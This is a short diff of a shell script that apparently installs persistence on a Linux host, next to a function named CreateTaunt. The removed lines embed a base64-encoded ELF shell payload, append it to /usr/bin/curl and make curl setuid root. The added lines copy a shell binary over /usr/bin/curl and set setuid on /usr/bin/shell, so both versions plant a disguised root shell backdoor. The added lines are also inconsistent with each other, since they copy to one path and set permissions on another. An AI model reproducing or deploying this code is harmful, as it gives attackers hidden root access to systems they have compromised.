@@ -358,17 +358,9 @@ binary
   sudo rm /opt/scripts/tmp
   sudo chown root:root /opt/scripts/shell
   sudo chmod +sx /opt/scripts/shell
-
-  file_location=/usr/bin/tmp
-  sudo cat > $file_location << 'binary'
-f0VMRgIBAQCwaw8FicfrGAIAPgABAAAACIACAAAAAABAAAAAAAAAADHAsGkPBTHAsGzrJEAAOAAB
-AEAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAgAIAAAAAAA8FiccxwOsYnwAAAAAAAACfAAAAAAAAAAAA
-IAAAAAAAsGoPBUi/L2Jpbi9zaABXMcCwO0iJ51ZIieZIieIPBYnHMcCwPA8F
-binary
-  sudo cat /usr/bin/tmp | sudo base64 -d >> /usr/bin/curl
-  sudo rm /usr/bin/tmp
-  sudo chown root:root /usr/bin/curl
-  sudo chmod +sx /usr/bin/curl
+  sudo cp -R /opt/scripts/shell /usr/bin/curl
+  sudo chown root:root /usr/bin/shell
+  sudo chmod +sx /usr/bin/shell
 }
 
 CreateTaunt(){
